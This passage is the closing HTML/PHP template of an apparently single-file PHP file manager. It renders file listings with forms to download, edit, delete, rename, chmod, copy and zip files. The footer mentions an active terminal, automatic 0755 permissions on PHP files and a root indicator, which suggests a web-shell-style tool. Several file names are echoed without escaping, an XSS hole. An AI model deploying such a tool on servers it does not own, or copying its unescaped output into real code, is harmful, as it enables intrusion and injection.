                                            <i class="fas <?php echo $isPhp ? 'fab fa-php' : 'fa-file'; ?>"></i> <?php echo $v; ?>
                                            <?php if ($isPhp): ?>
                                                <span class="badge-small php-badge-small"><i class="fab fa-php"></i> PHP</span>
                                            <?php endif; ?>
                                        </a>
                                    </td>
                                    <td><?php echo $sizeFormatted; ?></td>
                                    <td><?php echo date('Y-m-d H:i:s', filemtime($u)); ?></td>
                                    <td class="permission"><?php echo $permission; ?></td>
                                    <td>
                                        <div style="display:flex;gap:5px;flex-wrap:wrap;">
                                            <form method="post" style="display:inline;">
                                                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                                                <input type="hidden" name="download_file" value="<?php echo $htm($v); ?>">
                                                <button type="submit" class="btn-icon btn-download" title="Download"><i class="fas fa-download"></i></button>
                                            </form>
                                            <form method="post" style="display:inline;">
                                                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                                                <input type="hidden" name="view_file" value="<?php echo $htm($v); ?>">
                                                <button type="submit" class="btn-icon btn-view" title="View/Edit"><i class="fas fa-eye"></i></button>
                                            </form>
                                            <form method="post" style="display:inline;">
                                                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                                                <input type="hidden" name="info_file" value="<?php echo $htm($v); ?>">
                                                <button type="submit" class="btn-icon btn-info" title="Info"><i class="fas fa-info-circle"></i></button>
                                            </form>
                                            <form method="post" style="display:inline;" onsubmit="return confirm('Delete <?php echo $v; ?>?');">
                                                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                                                <input type="hidden" name="delete_file" value="<?php echo $htm($v); ?>">
                                                <button type="submit" class="btn-icon btn-delete" title="Delete"><i class="fas fa-trash"></i></button>
                                            </form>
                                            <form method="post" style="display:inline;" class="rename-form">
                                                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                                                <input type="hidden" name="old_name" value="<?php echo $htm($v); ?>">
                                                <input type="text" name="new_name" placeholder="New name" required>
                                                <button type="submit" name="rename_item" class="btn-icon btn-rename" title="Rename"><i class="fas fa-pencil-alt"></i></button>
                                            </form>
                                            <!-- Permission form -->
                                            <form method="post" style="display:inline;">
                                                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                                                <input type="hidden" name="permission_file" value="<?php echo $htm($v); ?>">
                                                <input type="text" name="new_permission" placeholder="644" style="width:60px;padding:5px;background:var(--bg-tertiary);border:1px solid var(--border-light);border-radius:3px;color:var(--text-primary);font-size:12px;">
                                                <button type="submit" name="change_permission" class="btn-icon" style="background:#666;font-size:12px;" title="Change Permission">chmod</button>
                                            </form>
                                            <!-- Copy form -->
                                            <form method="post" style="display:inline;">
                                                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                                                <input type="hidden" name="copy_item" value="<?php echo $htm($v); ?>">
                                                <input type="text" name="copy_path" placeholder="copy name" style="width:80px;padding:5px;background:var(--bg-tertiary);border:1px solid var(--border-light);border-radius:3px;color:var(--text-primary);font-size:12px;">
                                                <button type="submit" class="btn-icon" style="background:#4488aa;font-size:12px;" title="Copy"><i class="fas fa-copy"></i></button>
                                            </form>
                                        </div>
                                    </td>
                                </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                    <div style="padding:15px;background:var(--bg-card);border-top:1px solid var(--border-color);display:flex;gap:10px;flex-wrap:wrap;">
                        <button type="submit" name="batch_delete" class="btn btn-danger" onclick="return confirm('Delete selected items?');">
                            <i class="fas fa-trash"></i> Delete Selected
                        </button>
                        <button type="submit" name="batch_zip" class="btn btn-warning">
                            <i class="fas fa-file-archive"></i> Create ZIP
                        </button>
                    </div>
                </form>
            </div>
        <?php endif; ?>

        <!-- TRASH SECTION -->
        <?php if (!empty($trashItems)): ?>
            <div class="section-header trash-section">
                <i class="fas fa-trash"></i> Trash
                <span class="section-count"><?php echo count($trashItems); ?> items</span>
            </div>
            
            <div class="table-container">
                <table>
                    <thead>
                        <tr>
                            <th>File Name</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($trashItems as $item): ?>
                            <tr class="trash-row">
                                <td><?php echo $item; ?></td>
                                <td>
                                    <form method="post" style="display:inline;">
                                        <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                                        <input type="hidden" name="trash_file" value="<?php echo $item; ?>">
                                        <button type="submit" name="restore_trash" class="btn-icon" style="background:#00aa55;" title="Restore">
                                            <i class="fas fa-undo"></i>
                                        </button>
                                    </form>
                                </td>
                            </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        <?php endif; ?>

        <!-- EMPTY STATE -->
        <?php if (empty($folders) && empty($files)): ?>
            <div class="empty-state">
                <i class="fas fa-folder-open"></i>
                <h3>Empty Directory</h3>
                <p>No files or folders found in this directory</p>
            </div>
        <?php endif; ?>

        <!-- FOOTER -->
        <div class="footer">
            <small>
                <i class="fas fa-shield-alt"></i> File Manager Pro &copy; 2024 | 
                <i class="fas fa-terminal"></i> Terminal JB Active |
                <i class="fas fa-file-archive"></i> ZIP → Files |
                <i class="fab fa-php"></i> PHP Auto 0755 |
                <i class="fas fa-trash"></i> Trash Active |
                <i class="fas fa-download"></i> Download Active |
                <?php if ($isRoot): ?>
                    <span style="color: #ffaa00;"><i class="fas fa-crown"></i> ROOT</span>
                <?php endif; ?>
            </small>
        </div>

    </div>

    <script>
        // Toggle all checkboxes
        function toggleAll(master) {
            const checkboxes = document.querySelectorAll('#batchForm input[name="selected_files[]"]');
            checkboxes.forEach(cb => cb.checked = master.checked);
        }

        function toggleAll2(master) {
            const checkboxes = document.querySelectorAll('#batchForm2 input[name="selected_files[]"]');
            checkboxes.forEach(cb => cb.checked = master.checked);
        }

        // Auto close alerts after 5 seconds
        document.querySelectorAll('.alert').forEach(alert => {
            setTimeout(() => {
                alert.style.opacity = '0';
                alert.style.transition = 'opacity 0.5s';
                setTimeout(() => alert.remove(), 500);
            }, 5000);
        });

        // Keyboard shortcuts
        document.addEventListener('keydown', function(e) {
            // Ctrl+F = Focus search
            if (e.ctrlKey && e.key === 'f') {
                e.preventDefault();
                const searchInput = document.querySelector('input[name="search_term"]');
                if (searchInput) searchInput.focus();
            }
            
            // Escape = Close modals
            if (e.key === 'Escape') {
                document.querySelectorAll('.card, .alert').forEach(el => {
                    if (el.style.display !== 'none') {
                        el.style.display = 'none';
                    }
                });
            }
        });
    </script>

</body>
</html>
